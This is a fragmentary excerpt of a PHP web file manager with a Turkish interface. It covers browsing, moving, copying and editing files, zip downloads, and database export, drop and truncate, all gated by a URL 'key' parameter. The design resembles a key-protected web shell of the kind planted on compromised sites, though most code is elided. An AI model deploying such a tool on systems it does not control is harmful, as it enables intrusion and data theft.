                ...
                if ($act == 'drop' || $act == 'truncate') {
                    ...
                    foreach($tables as $tbl) {
                        ...
                        while($row = $res->fetch_assoc()) {
                                $vals = array_map(function($v) use ($db_conn){ return "'".$db_conn->real_escape_string($v)."'"; }, $row);
...
if ($action === 'move' && isset($_POST['files'], $_POST['destination'])) {
    ...
    if ($destDir) {
        ...
        $success_link = ($destDir) ? '<a href="?dir=' . urlencode($destDir) . "&key=" . $KEY_PARAM . '" class="btn btn-sm btn-info ms-2"><i class="bi bi-folder-check"></i> Dizine Git</a>' : '';
        $success = $moved ? 'Taşındı: ' . implode(', ', $moved) . $success_link : ($error ? $error : 'Taşıma başarısız!');
...
if ($action === 'copy' && isset($_POST['files'], $_POST['destination'])) {
    ...
    if ($destDir) {
        ...
        $success_link = ($destDir) ? '<a href="?dir=' . urlencode($destDir) . "&key=" . $KEY_PARAM . '" class="btn btn-sm btn-info ms-2"><i class="bi bi-folder-check"></i> Dizine Git</a>' : '';
        $success = $copied ? 'Kopyalandı: ' . implode(', ', $copied) . $success_link : ($error ? $error : 'Kopyalama başarısız!');
    } else { $error = 'Geçersiz hedef dizin: ' . htmlspecialchars($destDirInput) . '!'; }
}
...
if ($action === 'database_export' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    try {
        ...
        if (file_exists($sql_file)) {
            ...
            header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($sql_file) . '"'); header('Content-Length: ' . $fileSize); readfile($sql_file); exit;
...
<body>
    ...
    <div class="container mt-4">
            ...
            <ol class="breadcrumb">
                ...
                ?>
                    <li class="breadcrumb-item">
                        <a href="?dir=<?php echo urlencode($crumb['path']); ?>&key=<?php echo $KEY_PARAM; ?><?php echo $linkParams; ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
                    </li>
                <?php } ?>
        ...
        <?php
            ...
            $baseLink = "?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . (!empty($searchTerm) ? "&action=search&query=" . urlencode($searchTerm) . "&search_type=" . urlencode($searchType) : "") . $linkParams;
                ...
                <tbody>
                    ...
                    <tr data-file-name=".." data-file-type="dir" data-perms="-" data-mtime="">
                        ...
                        <td>
                            ...
                            <a href="?dir=<?php echo urlencode($parentDir); ?>&key=<?php echo $KEY_PARAM; ?><?php echo $linkParams; ?>">..</a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                        ...
                        <div class="tab-content">
                            ...
                            <div class="tab-pane fade" id="db-advanced">
                                <?php if (!isset($_SESSION['db_host'])): ?>
                                    ...
                                    <form method="POST" action="?dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                                        ...
                                        <div class="col-md-9">
                                            <div class="tab-content">
                                                <div class="tab-pane fade" id="db-import-advanced" role="tabpanel">
                                                    ...
                                                    <form method="POST" action="?dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data">
    ...
    <script>
        ...
        function openEditModal(fileName) {
            ...
            fetch(`?action=get_file_content&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&file=${encodedFilePath}`).then(response => {
        ...
        function openZipDownloadModal(action) {
            ...
            document.getElementById('zipDownloadFormFinal').action = `?action=${action}&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;
